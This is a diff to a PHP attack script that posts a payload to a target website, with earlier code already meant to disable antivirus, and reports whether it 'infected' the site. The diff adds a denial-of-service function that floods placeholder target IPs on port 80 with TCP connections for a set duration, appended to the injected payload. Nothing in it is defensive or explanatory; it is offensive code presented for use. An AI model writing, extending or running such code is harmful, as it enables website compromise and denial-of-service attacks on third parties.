@@ -1,5 +1,4 @@
 <?php
-
 error_reporting(0);
 
 $targetURL = "http://www.targetwebsite.com/";
@@ -20,6 +19,27 @@ disableAntivirus();';
 
 $payload .= $disableAntivirusCode;
 
+$ddosAttackCode = 'function ddosAttack($targetIPs, $targetPort, $attackTime) {
+    $timeStart = time();
+    $timeEnd = $timeStart + $attackTime;
+
+    while (time() < $timeEnd) {
+        foreach ($targetIPs as $targetIP) {
+            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+            socket_connect($socket, $targetIP, $targetPort);
+            socket_close($socket);
+        }
+    }
+}
+
+$targetIPs = array("192.168.0.1", "192.168.0.2", "192.168.0.3"); // Replace with target IP addresses
+$targetPort = 80; // Replace with target port
+$attackTime = 10000; // Replace with attack duration in seconds
+
+ddosAttack($targetIPs, $targetPort, $attackTime);';
+
+$payload .= $ddosAttackCode;
+
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $targetURL);
 curl_setopt($ch, CURLOPT_POST, true);
@@ -33,4 +53,3 @@ if ($response === "SUCCESS") {
 } else {
     echo "Failed to infect the website. Try again later.";
 }
-?>
